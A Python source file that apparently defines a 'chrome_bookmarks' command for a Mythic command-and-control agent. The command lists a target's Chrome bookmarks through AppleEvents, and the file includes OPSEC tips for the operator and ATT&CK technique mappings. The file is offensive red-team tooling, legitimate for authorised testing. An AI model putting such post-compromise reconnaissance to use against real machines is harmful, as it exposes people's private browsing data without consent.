from mythic_container.MythicCommandBase import *
import json
from mythic_container.MythicRPC import *


class ChromeBookmarksArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = []

    async def parse_arguments(self):
        pass


class ChromeBookmarksCommand(CommandBase):
    cmd = "chrome_bookmarks"
    needs_admin = False
    help_cmd = "chrome_bookmarks"
    description = "This uses AppleEvents to list information about all of the bookmarks in Chrome. If Chrome is not currently running, this will launch Chrome (potential OPSEC issue) and might have a conflict with trying to access Chrome's bookmarks as Chrome is starting. It's recommended to not use this unless Chrome is already running. Use the list_apps function to check if Chrome is running. In Mojave this will cause a popup the first time asking for permission for your process to access Chrome"
    version = 1
    author = "@its_a_feature_"
    attackmapping = ["T1217", "T1059.002", "T1559"]
    argument_class = ChromeBookmarksArguments

    async def create_go_tasking(self, taskData: MythicCommandBase.PTTaskMessageAllData) -> MythicCommandBase.PTTaskCreateTaskingMessageResponse:
        response = MythicCommandBase.PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )
        await SendMythicRPCArtifactCreate(MythicRPCArtifactCreateMessage(
            TaskID=taskData.Task.ID,
            ArtifactMessage=f"Target Application of Chrome",
            BaseArtifactType="AppleEvent"
        ))
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp
